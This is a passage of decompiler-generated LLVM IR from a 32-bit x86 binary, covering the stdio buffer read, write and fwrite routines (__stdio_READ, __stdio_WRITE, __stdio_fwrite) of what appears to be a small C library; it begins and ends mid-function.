dec_label_pc_80624fb:                             ; preds = %dec_label_pc_806251a
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_806252e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_806252a

dec_label_pc_80624ff:                             ; preds = %dec_label_pc_80624d7
  %v2_80624ff = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80624ff, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8062503

dec_label_pc_8062503:                             ; preds = %dec_label_pc_80624e2, %dec_label_pc_80624ff
  %v2_806251c17 = phi i32 [ %v2_80624e2, %dec_label_pc_80624e2 ], [ %v2_80624ff, %dec_label_pc_80624ff ]
  %v1_806250813 = phi i32 [ -1, %dec_label_pc_80624e2 ], [ %arg4, %dec_label_pc_80624ff ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8062505

dec_label_pc_8062505:                             ; preds = %dec_label_pc_80624d7, %dec_label_pc_8062503
  %v2_806251c16 = phi i32 [ %v4_80624c3, %dec_label_pc_80624d7 ], [ %v2_806251c17, %dec_label_pc_8062503 ]
  %v0_806250a = phi i32 [ %arg4, %dec_label_pc_80624d7 ], [ %v1_806250813, %dec_label_pc_8062503 ]
  %v1_8062505 = inttoptr i32 %arg2 to i32*
  %v2_8062505 = load i32, i32* %v1_8062505, align 4
  store i32 %v2_8062505, i32* %ebx.global-to-local, align 4
  %tmp32 = icmp uge i32 %v0_806250a, %arg3
  %v5_806250c = select i1 %tmp32, i32 %arg3, i32 %v0_806250a
  store i32 %v5_806250c, i32* %edi.global-to-local, align 4
  store i32 %v5_806250c, i32* @ecx, align 4
  %v1_80625264 = icmp eq i32 %v5_806250c, 0
  store i1 %v1_80625264, i1* %zf.global-to-local, align 1
  %v1_806252811 = icmp eq i1 %v1_80625264, false
  br i1 %v1_806252811, label %dec_label_pc_8062513, label %dec_label_pc_806252a

dec_label_pc_8062513:                             ; preds = %dec_label_pc_8062505, %dec_label_pc_8062520
  %v2_806251c = phi i32 [ %v2_8062523, %dec_label_pc_8062520 ], [ %v2_806251c16, %dec_label_pc_8062505 ]
  %v0_8062513 = phi i32 [ %v1_8062520, %dec_label_pc_8062520 ], [ %v2_8062505, %dec_label_pc_8062505 ]
  %v1_8062513 = inttoptr i32 %v0_8062513 to i32*
  %v2_8062513 = load i32, i32* %v1_8062513, align 4
  %v9_8062515 = icmp eq i32 %v2_8062513, 127
  store i1 %v9_8062515, i1* %zf.global-to-local, align 1
  %v6_8062518 = icmp ugt i32 %v2_8062513, 127
  br i1 %v6_8062518, label %dec_label_pc_80624eb, label %dec_label_pc_806251a

dec_label_pc_806251a:                             ; preds = %dec_label_pc_8062513
  %v3_806251a = trunc i32 %v2_8062513 to i8
  %v4_806251a = icmp eq i8 %v3_806251a, 0
  store i1 %v4_806251a, i1* %zf.global-to-local, align 1
  %v3_806251c = inttoptr i32 %v2_806251c to i8*
  store i8 %v3_806251a, i8* %v3_806251c, align 1
  %v0_806251e = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_806251e, label %dec_label_pc_80624fb, label %dec_label_pc_8062520

dec_label_pc_8062520:                             ; preds = %dec_label_pc_806251a
  %v0_8062520 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8062520 = add i32 %v0_8062520, 4
  store i32 %v1_8062520, i32* %ebx.global-to-local, align 4
  %v0_8062523 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062523 = load i32, i32* %esi.global-to-local, align 4
  %v2_8062523 = add i32 %v1_8062523, %v0_8062523
  store i32 %v2_8062523, i32* %edx.global-to-local, align 4
  %v0_8062525 = load i32, i32* @ecx, align 4
  %v1_8062525 = add i32 %v0_8062525, -1
  %v8_8062525 = icmp eq i32 %v1_8062525, 0
  store i32 %v1_8062525, i32* @ecx, align 4
  store i1 %v8_8062525, i1* %zf.global-to-local, align 1
  %v1_8062528 = icmp eq i1 %v8_8062525, false
  br i1 %v1_8062528, label %dec_label_pc_8062513, label %dec_label_pc_806252a

dec_label_pc_806252a:                             ; preds = %dec_label_pc_8062520, %dec_label_pc_8062505, %dec_label_pc_80624fb
  %v0_8062532 = phi i32 [ 0, %dec_label_pc_80624fb ], [ %v2_8062505, %dec_label_pc_8062505 ], [ %v1_8062520, %dec_label_pc_8062520 ]
  %v0_806252e = phi i32 [ %v0_806252e.pre, %dec_label_pc_80624fb ], [ %v2_806251c16, %dec_label_pc_8062505 ], [ %v2_8062523, %dec_label_pc_8062520 ]
  %v2_806252a = ptrtoint i32* %stack_var_-32 to i32
  %v12_806252e = icmp eq i32 %v0_806252e, %v2_806252a
  store i1 %v12_806252e, i1* %zf.global-to-local, align 1
  br i1 %v12_806252e, label %dec_label_pc_8062535, label %dec_label_pc_8062532

dec_label_pc_8062532:                             ; preds = %dec_label_pc_806252a
  %v1_8062532 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8062532 = inttoptr i32 %v1_8062532 to i32*
  store i32 %v0_8062532, i32* %v2_8062532, align 4
  br label %dec_label_pc_8062535

dec_label_pc_8062535:                             ; preds = %dec_label_pc_806252a, %dec_label_pc_8062532
  %v0_8062535 = load i32, i32* %edi.global-to-local, align 4
  %v1_8062537 = load i32, i32* @ecx, align 4
  %v2_8062537 = sub i32 %v0_8062535, %v1_8062537
  %v12_8062537 = icmp eq i32 %v2_8062537, 0
  br label %dec_label_pc_8062539

dec_label_pc_8062539:                             ; preds = %dec_label_pc_80624eb, %dec_label_pc_8062535
  %storemerge = phi i1 [ %v12_8062537, %dec_label_pc_8062535 ], [ false, %dec_label_pc_80624eb ]
  %storemerge2 = phi i32 [ %v2_8062537, %dec_label_pc_8062535 ], [ -1, %dec_label_pc_80624eb ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_8062539 = load i32, i32* @esp, align 4
  %v9_8062539 = icmp eq i32 %v0_8062539, -28
  store i1 %v9_8062539, i1* %zf.global-to-local, align 1
  store i32 %v0_80624bf, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i1 %v12_806252e, { 1, 0 }
  uselistorder i32 %v2_8062523, { 0, 2, 1 }
  uselistorder i32 %v1_8062520, { 0, 2, 1 }
  uselistorder i32 %v2_8062513, { 1, 2, 0 }
  uselistorder i32 %v2_8062505, { 1, 0, 2 }
  uselistorder i32 %v0_806250a, { 1, 0 }
  uselistorder i32 %v2_806251c16, { 1, 0 }
  uselistorder i1 %v12_80624d7, { 1, 0 }
  uselistorder i32 %v4_80624c3, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 2, 1, 3, 8, 5, 6, 7, 0, 9, 4, 10, 11, 12 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 2, 0, 1, 4, 3, 5 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8062539, { 1, 0 }
  uselistorder label %dec_label_pc_8062535, { 1, 0 }
  uselistorder label %dec_label_pc_8062513, { 1, 0 }
  uselistorder label %dec_label_pc_8062505, { 1, 0 }
  uselistorder label %dec_label_pc_8062503, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8062578 = load i32, i32* @ebx, align 4
  store i32 %v0_8062578, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_806257e = ptrtoint i16* %arg1 to i32
  store i32 %v4_806257e, i32* @ebx, align 4
  %v1_8062586 = bitcast i16* %arg1 to i8*
  %v2_8062586 = load i8, i8* %v1_8062586, align 1
  %v3_8062586 = and i8 %v2_8062586, 4
  %v4_8062586 = icmp eq i8 %v3_8062586, 0
  %v1_8062589 = icmp eq i1 %v4_8062586, false
  br i1 %v1_8062589, label %dec_label_pc_80625c1, label %dec_label_pc_806258b

dec_label_pc_806258b:                             ; preds = %entry
  %v2_806258b = icmp slt i32 %arg3, 0
  %v3_8062592 = select i1 %v2_806258b, i32 2147483647, i32 %arg3
  %v1_806259b = add i32 %v4_806257e, 4
  %v2_806259b = inttoptr i32 %v1_806259b to i32*
  %v3_806259b = load i32, i32* %v2_806259b, align 4
  %v3_806259e = call i32 @__libc_read(i32 %v3_806259b, i32 %arg2, i32 %v3_8062592)
  store i32 %v3_806259e, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp slt i32 %v3_806259e, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_80625c1, label %dec_label_pc_80625ad

dec_label_pc_80625ad:                             ; preds = %dec_label_pc_806258b
  %v1_80625a6 = icmp eq i32 %v3_806259e, 0
  %v4_80625ab = icmp eq i1 %v1_80625a6, false
  %v0_80625ad = load i32, i32* @ebx, align 4
  %v1_80625ad = inttoptr i32 %v0_80625ad to i32*
  %v2_80625ad = load i32, i32* %v1_80625ad, align 4
  br i1 %v4_80625ab, label %dec_label_pc_80625b9, label %dec_label_pc_80625b1

dec_label_pc_80625b1:                             ; preds = %dec_label_pc_80625ad
  %v1_80625b1 = or i32 %v2_80625ad, 4
  %v1_80625b4 = trunc i32 %v1_80625b1 to i16
  %v3_80625b4 = inttoptr i32 %v0_80625ad to i16*
  store i16 %v1_80625b4, i16* %v3_80625b4, align 2
  br label %dec_label_pc_80625c1

dec_label_pc_80625b9:                             ; preds = %dec_label_pc_80625ad
  %v1_80625b9 = or i32 %v2_80625ad, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_80625be = trunc i32 %v1_80625b9 to i16
  %v3_80625be = inttoptr i32 %v0_80625ad to i16*
  store i16 %v1_80625be, i16* %v3_80625be, align 2
  br label %dec_label_pc_80625c1

dec_label_pc_80625c1:                             ; preds = %dec_label_pc_806258b, %entry, %dec_label_pc_80625b1, %dec_label_pc_80625b9
  %v0_80625c2 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80625c5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80625c5, i32* @ebx, align 4
  ret i32 %v0_80625c2

; uselistorder directives
  uselistorder i32 %v3_806259e, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80625c1, { 3, 2, 0, 1 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_80625c8 = load i32, i32* @ebp, align 4
  %v0_80625c9 = load i32, i32* @edi, align 4
  %v0_80625ca = load i32, i32* @esi, align 4
  %v0_80625cb = load i32, i32* @ebx, align 4
  %v15_80625cc = ptrtoint i32* %stack_var_-28 to i32
  %v4_80625cf = ptrtoint i16* %arg1 to i32
  store i32 %v4_80625cf, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_80625db5 = icmp eq i32 %arg3, 0
  store i1 %v1_80625db5, i1* %zf.global-to-local, align 1
  br i1 %v1_80625db5, label %dec_label_pc_806263c, label %dec_label_pc_80625e0.lr.ph

dec_label_pc_80625e0.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80625e0

dec_label_pc_80625e0:                             ; preds = %dec_label_pc_80625fc.dec_label_pc_80625e0_crit_edge, %dec_label_pc_80625e0.lr.ph
  %v0_80625ed = phi i32 [ %v4_80625cf, %dec_label_pc_80625e0.lr.ph ], [ %v0_80625ed.pre, %dec_label_pc_80625fc.dec_label_pc_80625e0_crit_edge ]
  %v0_80625ec = phi i32 [ %arg2, %dec_label_pc_80625e0.lr.ph ], [ %v2_80625fe, %dec_label_pc_80625fc.dec_label_pc_80625e0_crit_edge ]
  %v0_80625e8.in = phi i32 [ %arg3, %dec_label_pc_80625e0.lr.ph ], [ %v2_80625fc, %dec_label_pc_80625fc.dec_label_pc_80625e0_crit_edge ]
  %v4_80625e8 = phi i32 [ %arg3, %dec_label_pc_80625e0.lr.ph ], [ %v2_80625fc, %dec_label_pc_80625fc.dec_label_pc_80625e0_crit_edge ]
  %v0_80625e8 = icmp slt i32 %v0_80625e8.in, 0
  store i32 %v4_80625e8, i32* @esi, align 4
  %v2_80625e8 = icmp eq i1 %v0_80625e8, false
  %v5_80625e8 = select i1 %v2_80625e8, i32 %v4_80625e8, i32 2147483647
  store i32 %v5_80625e8, i32* %eax.global-to-local, align 4
  %v1_80625ed = add i32 %v0_80625ed, 4
  %v2_80625ed = inttoptr i32 %v1_80625ed to i32*
  %v3_80625ed = load i32, i32* %v2_80625ed, align 4
  %v4_80625f0 = call i32 @__libc_write(i32 %v3_80625ed, i32 %v0_80625ec, i32 %v5_80625e8)
  store i32 %v4_80625f0, i32* %eax.global-to-local, align 4
  %v1_80625f8 = icmp eq i32 %v4_80625f0, 0
  store i1 %v1_80625f8, i1* %zf.global-to-local, align 1
  %v2_80625f8 = icmp slt i32 %v4_80625f0, 0
  br i1 %v2_80625f8, label %dec_label_pc_8062602, label %dec_label_pc_80625fc

dec_label_pc_80625fc:                             ; preds = %dec_label_pc_80625e0
  %v0_80625fc = load i32, i32* @ebx, align 4
  %v2_80625fc = sub i32 %v0_80625fc, %v4_80625f0
  %v12_80625fc = icmp eq i32 %v2_80625fc, 0
  store i32 %v2_80625fc, i32* @ebx, align 4
  %v0_80625fe = load i32, i32* @edi, align 4
  %v2_80625fe = add i32 %v0_80625fe, %v4_80625f0
  store i32 %v2_80625fe, i32* @edi, align 4
  store i1 %v12_80625fc, i1* %zf.global-to-local, align 1
  br i1 %v12_80625fc, label %dec_label_pc_806263c, label %dec_label_pc_80625fc.dec_label_pc_80625e0_crit_edge

dec_label_pc_80625fc.dec_label_pc_80625e0_crit_edge: ; preds = %dec_label_pc_80625fc
  %v0_80625ed.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80625e0

dec_label_pc_8062602:                             ; preds = %dec_label_pc_80625e0
  %v0_8062602 = load i32, i32* @ebp, align 4
  %v1_8062602 = inttoptr i32 %v0_8062602 to i32*
  %v2_8062602 = load i32, i32* %v1_8062602, align 4
  store i32 %v2_8062602, i32* %eax.global-to-local, align 4
  %v1_8062605 = add i32 %v0_8062602, 8
  %v2_8062605 = inttoptr i32 %v1_8062605 to i32*
  %v3_8062605 = load i32, i32* %v2_8062605, align 4
  store i32 %v3_8062605, i32* @edx, align 4
  %v1_8062608 = or i32 %v2_8062602, 8
  store i32 %v1_8062608, i32* %eax.global-to-local, align 4
  %v1_806260b = trunc i32 %v1_8062608 to i16
  %v3_806260b = inttoptr i32 %v0_8062602 to i16*
  store i16 %v1_806260b, i16* %v3_806260b, align 2
  %v0_806260f = load i32, i32* @ebp, align 4
  %v1_806260f = add i32 %v0_806260f, 12
  %v2_806260f = inttoptr i32 %v1_806260f to i32*
  %v3_806260f = load i32, i32* %v2_806260f, align 4
  %v1_8062612 = load i32, i32* @edx, align 4
  %v2_8062612 = sub i32 %v3_806260f, %v1_8062612
  %v12_8062612 = icmp eq i32 %v2_8062612, 0
  store i1 %v12_8062612, i1* %zf.global-to-local, align 1
  store i32 %v2_8062612, i32* %eax.global-to-local, align 4
  %v4_8062638.pre = load i32, i32* @ebx, align 4
  br i1 %v12_8062612, label %dec_label_pc_8062638, label %dec_label_pc_8062616

dec_label_pc_8062616:                             ; preds = %dec_label_pc_8062602
  %v12_8062616 = icmp eq i32 %v2_8062612, %v4_8062638.pre
  store i1 %v12_8062616, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_8062612, %v4_8062638.pre
  %v3_8062618 = load i32, i32* @esi, align 4
  %v5_8062618 = select i1 %tmp, i32 %v2_8062612, i32 %v3_8062618
  store i32 %v5_8062618, i32* %esi.global-to-local, align 4
  %v0_806261b.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_806261b

dec_label_pc_806261b:                             ; preds = %dec_label_pc_806262d, %dec_label_pc_8062616
  %v2_806261f = phi i32 [ %v1_8062629, %dec_label_pc_806262d ], [ %v1_8062612, %dec_label_pc_8062616 ]
  %v4_806261b = phi i32 [ %v4_806261b.pre, %dec_label_pc_806262d ], [ %v2_8062612, %dec_label_pc_8062616 ]
  %v0_806261b = phi i32 [ %v1_806262d, %dec_label_pc_806262d ], [ %v0_806261b.pre, %dec_label_pc_8062616 ]
  %v1_806261b = inttoptr i32 %v0_806261b to i8*
  %v2_806261b = load i8, i8* %v1_806261b, align 1
  %v3_806261b = zext i8 %v2_806261b to i32
  %v5_806261b = and i32 %v4_806261b, -256
  %v6_806261b = or i32 %v3_806261b, %v5_806261b
  store i32 %v6_806261b, i32* %eax.global-to-local, align 4
  %v10_806261d = icmp eq i8 %v2_806261b, 10
  store i1 %v10_806261d, i1* %zf.global-to-local, align 1
  %v3_806261f = inttoptr i32 %v2_806261f to i8*
  store i8 %v2_806261b, i8* %v3_806261f, align 1
  %v0_8062621 = load i1, i1* %zf.global-to-local, align 1
  %v1_8062621 = icmp eq i1 %v0_8062621, false
  br i1 %v1_8062621, label %dec_label_pc_8062629, label %dec_label_pc_8062623

dec_label_pc_8062623:                             ; preds = %dec_label_pc_806261b
  %v0_8062623 = load i32, i32* @ebp, align 4
  %v1_8062623 = add i32 %v0_8062623, 1
  %v2_8062623 = inttoptr i32 %v1_8062623 to i8*
  %v3_8062623 = load i8, i8* %v2_8062623, align 1
  %v4_8062623 = urem i8 %v3_8062623, 2
  %v5_8062623 = icmp eq i8 %v4_8062623, 0
  store i1 %v5_8062623, i1* %zf.global-to-local, align 1
  %v1_8062627 = icmp eq i1 %v5_8062623, false
  br i1 %v1_8062627, label %dec_label_pc_8062623.dec_label_pc_8062630_crit_edge, label %dec_label_pc_8062629

dec_label_pc_8062623.dec_label_pc_8062630_crit_edge: ; preds = %dec_label_pc_8062623
  %v0_8062630.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8062630

dec_label_pc_8062629:                             ; preds = %dec_label_pc_8062623, %dec_label_pc_806261b
  %v0_8062629 = load i32, i32* @edx, align 4
  %v1_8062629 = add i32 %v0_8062629, 1
  store i32 %v1_8062629, i32* @edx, align 4
  %v0_806262a = load i32, i32* %esi.global-to-local, align 4
  %v1_806262a = add i32 %v0_806262a, -1
  %v8_806262a = icmp eq i32 %v1_806262a, 0
  store i1 %v8_806262a, i1* %zf.global-to-local, align 1
  store i32 %v1_806262a, i32* %esi.global-to-local, align 4
  br i1 %v8_806262a, label %dec_label_pc_8062629.dec_label_pc_8062630_crit_edge, label %dec_label_pc_806262d

dec_label_pc_8062629.dec_label_pc_8062630_crit_edge: ; preds = %dec_label_pc_8062629
  %v1_8062630.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8062630

dec_label_pc_806262d:                             ; preds = %dec_label_pc_8062629
  %v0_806262d = load i32, i32* @edi, align 4
  %v1_806262d = add i32 %v0_806262d, 1
  %v8_806262d = icmp eq i32 %v1_806262d, 0
  store i1 %v8_806262d, i1* %zf.global-to-local, align 1
  store i32 %v1_806262d, i32* @edi, align 4
  %v4_806261b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806261b

dec_label_pc_8062630:                             ; preds = %dec_label_pc_8062629.dec_label_pc_8062630_crit_edge, %dec_label_pc_8062623.dec_label_pc_8062630_crit_edge
  %v1_8062630 = phi i32 [ %v0_8062623, %dec_label_pc_8062623.dec_label_pc_8062630_crit_edge ], [ %v1_8062630.pre, %dec_label_pc_8062629.dec_label_pc_8062630_crit_edge ]
  %v0_8062630 = phi i32 [ %v0_8062630.pre, %dec_label_pc_8062623.dec_label_pc_8062630_crit_edge ], [ %v1_8062629, %dec_label_pc_8062629.dec_label_pc_8062630_crit_edge ]
  %v2_8062630 = add i32 %v1_8062630, 16
  %v3_8062630 = inttoptr i32 %v2_8062630 to i32*
  store i32 %v0_8062630, i32* %v3_8062630, align 4
  %v0_8062633 = load i32, i32* @edx, align 4
  %v1_8062633 = load i32, i32* @ebp, align 4
  %v2_8062633 = add i32 %v1_8062633, 8
  %v3_8062633 = inttoptr i32 %v2_8062633 to i32*
  %v4_8062633 = load i32, i32* %v3_8062633, align 4
  %v5_8062633 = sub i32 %v0_8062633, %v4_8062633
  store i32 %v5_8062633, i32* @edx, align 4
  %v0_8062636 = load i32, i32* @ebx, align 4
  %v2_8062636 = sub i32 %v0_8062636, %v5_8062633
  %v12_8062636 = icmp eq i32 %v2_8062636, 0
  store i1 %v12_8062636, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8062638

dec_label_pc_8062638:                             ; preds = %dec_label_pc_8062602, %dec_label_pc_8062630
  %v4_8062638 = phi i32 [ %v2_8062636, %dec_label_pc_8062630 ], [ %v4_8062638.pre, %dec_label_pc_8062602 ]
  %v5_8062638 = sub i32 %arg3, %v4_8062638
  %v15_8062638 = icmp eq i32 %v5_8062638, 0
  store i1 %v15_8062638, i1* %zf.global-to-local, align 1
  %v0_8062640.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806263c

dec_label_pc_806263c:                             ; preds = %dec_label_pc_80625fc, %entry, %dec_label_pc_8062638
  %v0_8062640 = phi i32 [ %v0_8062640.pre, %dec_label_pc_8062638 ], [ %v15_80625cc, %entry ], [ %v15_80625cc, %dec_label_pc_80625fc ]
  %stack_var_12.0 = phi i32 [ %v5_8062638, %dec_label_pc_8062638 ], [ 0, %entry ], [ %arg3, %dec_label_pc_80625fc ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_8062640 = icmp eq i32 %v0_8062640, -12
  store i1 %v9_8062640, i1* %zf.global-to-local, align 1
  store i32 %v0_80625cb, i32* @ebx, align 4
  store i32 %v0_80625ca, i32* @esi, align 4
  store i32 %v0_80625c9, i32* @edi, align 4
  store i32 %v0_80625c8, i32* @ebp, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_806262d, { 1, 2, 0 }
  uselistorder i32 %v1_806262a, { 1, 0 }
  uselistorder i32 %v1_8062629, { 0, 2, 1 }
  uselistorder i8 %v2_806261b, { 1, 0, 2 }
  uselistorder i32 %v4_8062638.pre, { 2, 0, 1 }
  uselistorder i32 %v2_8062612, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_80625fe, { 1, 0 }
  uselistorder i32 %v2_80625fc, { 2, 3, 0, 1 }
  uselistorder i32 %v4_80625f0, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_write, { 1, 2, 0 }
  uselistorder i32 2147483647, { 0, 2, 1, 3 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_806263c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062638, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8062648 = load i32, i32* @ebp, align 4
  %v0_8062649 = load i32, i32* @edi, align 4
  %v0_806264a = load i32, i32* @esi, align 4
  %v0_806264b = load i32, i32* @ebx, align 4
  store i32 %v0_806264b, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_806265b = add i32 %arg3, 1
  %v2_806265b = inttoptr i32 %v1_806265b to i8*
  %v3_806265b = load i8, i8* %v2_806265b, align 1
  %v4_806265b = and i8 %v3_806265b, 2
  %v5_806265b = icmp eq i8 %v4_806265b, 0
  %v1_806265f = icmp eq i1 %v5_806265b, false
  br i1 %v1_806265f, label %dec_label_pc_8062710, label %dec_label_pc_8062665

dec_label_pc_8062665:                             ; preds = %entry
  %v1_8062665 = add i32 %arg3, 4
  %v2_8062665 = inttoptr i32 %v1_8062665 to i32*
  %v3_8062665 = load i32, i32* %v2_8062665, align 4
  %v13_8062665 = icmp eq i32 %v3_8062665, -2
  %v1_8062669 = add i32 %arg3, 16
  %v2_8062669 = inttoptr i32 %v1_8062669 to i32*
  %v3_8062669 = load i32, i32* %v2_8062669, align 4
  store i32 %v3_8062669, i32* @edx, align 4
  %v1_806266c = add i32 %arg3, 12
  %v2_806266c = inttoptr i32 %v1_806266c to i32*
  %v3_806266c = load i32, i32* %v2_806266c, align 4
  store i32 %v3_806266c, i32* %eax.global-to-local, align 4
  %v1_806266f = icmp eq i1 %v13_8062665, false
  %v2_806268e = sub i32 %v3_806266c, %v3_8062669
  br i1 %v1_806266f, label %dec_label_pc_806268e, label %dec_label_pc_8062671

dec_label_pc_8062671:                             ; preds = %dec_label_pc_8062665
  %tmp = icmp uge i32 %v2_806268e, %arg2
  %v5_8062678 = select i1 %tmp, i32 %arg2, i32 %v2_806268e
  store i32 %v5_8062678, i32* %ebx.global-to-local, align 4
  %v3_806267e = inttoptr i32 %v3_8062669 to i16*
  %v4_806267e = call i32 @memcpy(i16* %v3_806267e, i32 %v5_8062678, i32 %v3_806266c)
  store i32 %v4_806267e, i32* %eax.global-to-local, align 4
  %v0_8062686 = load i32, i32* @esi, align 4
  %v1_8062686 = add i32 %v0_8062686, 16
  %v2_8062686 = inttoptr i32 %v1_8062686 to i32*
  %v3_8062686 = load i32, i32* %v2_8062686, align 4
  %v4_8062686 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8062686 = add i32 %v4_8062686, %v3_8062686
  store i32 %v5_8062686, i32* %v2_8062686, align 4
  br label %dec_label_pc_8062728

dec_label_pc_806268e:                             ; preds = %dec_label_pc_8062665
  store i32 %v2_806268e, i32* %eax.global-to-local, align 4
  %v6_8062692 = icmp ult i32 %v2_806268e, %arg2
  br i1 %v6_8062692, label %dec_label_pc_80626f7, label %dec_label_pc_8062694

dec_label_pc_8062694:                             ; preds = %dec_label_pc_806268e
  %v0_8062694 = load i32, i32* @ecx, align 4
  %v3_8062698 = inttoptr i32 %v3_8062669 to i16*
  %v4_8062698 = call i32 @memcpy(i16* %v3_8062698, i32 %arg2, i32 %v0_8062694)
  store i32 %v4_8062698, i32* %eax.global-to-local, align 4
  %v0_80626a0 = load i32, i32* @esi, align 4
  %v1_80626a0 = add i32 %v0_80626a0, 16
  %v2_80626a0 = inttoptr i32 %v1_80626a0 to i32*
  %v3_80626a0 = load i32, i32* %v2_80626a0, align 4
  %v4_80626a0 = load i32, i32* @edi, align 4
  %v5_80626a0 = add i32 %v4_80626a0, %v3_80626a0
  store i32 %v5_80626a0, i32* %v2_80626a0, align 4
  %v0_80626a3 = load i32, i32* @esi, align 4
  %v1_80626a3 = add i32 %v0_80626a3, 1
  %v2_80626a3 = inttoptr i32 %v1_80626a3 to i8*
  %v3_80626a3 = load i8, i8* %v2_80626a3, align 1
  %v4_80626a3 = urem i8 %v3_80626a3, 2
  %v5_80626a3 = icmp eq i8 %v4_80626a3, 0
  br i1 %v5_80626a3, label %dec_label_pc_8062728, label %dec_label_pc_80626a9

dec_label_pc_80626a9:                             ; preds = %dec_label_pc_8062694
  %v0_80626a9 = load i32, i32* @edx, align 4
  %v0_80626aa = load i32, i32* @edi, align 4
  %v4_80626ae = call i32 @memrchr(i8 10, i32 %v0_80626aa, i32 %v0_80626a9)
  store i32 %v4_80626ae, i32* %eax.global-to-local, align 4
  %v1_80626b6 = icmp eq i32 %v4_80626ae, 0
  br i1 %v1_80626b6, label %dec_label_pc_8062728, label %dec_label_pc_80626ba

dec_label_pc_80626ba:                             ; preds = %dec_label_pc_80626a9
  %v0_80626bd = load i32, i32* @esi, align 4
  %v1_80626be = call i32 @__stdio_wcommit(i32 %v0_80626bd)
  store i32 %v1_80626be, i32* %eax.global-to-local, align 4
  %v1_80626c6 = icmp eq i32 %v1_80626be, 0
  br i1 %v1_80626c6, label %dec_label_pc_8062728, label %dec_label_pc_80626ca

dec_label_pc_80626ca:                             ; preds = %dec_label_pc_80626ba
  %v0_80626ca = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_80626ca, %v1_80626be
  %v5_80626ce = select i1 %tmp20, i32 %v0_80626ca, i32 %v1_80626be
  store i32 %v5_80626ce, i32* %ebx.global-to-local, align 4
  %v2_80626d3 = sub i32 %v0_80626ca, %v5_80626ce
  store i32 %v2_80626d3, i32* %eax.global-to-local, align 4
  %v0_80626d5 = load i32, i32* @ebp, align 4
  %v2_80626d5 = add i32 %v0_80626d5, %v2_80626d3
  store i32 %v2_80626d5, i32* %ebp.global-to-local, align 4
  %v4_80626dc = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v5_80626ce, i32 %v2_80626d3)
  store i32 %v4_80626dc, i32* %eax.global-to-local, align 4
  %v1_80626e4 = icmp eq i32 %v4_80626dc, 0
  store i32 %v4_80626dc, i32* @edx, align 4
  br i1 %v1_80626e4, label %dec_label_pc_8062728, label %dec_label_pc_80626ea

dec_label_pc_80626ea:                             ; preds = %dec_label_pc_80626ca
  %v0_80626ea = load i32, i32* %ebp.global-to-local, align 4
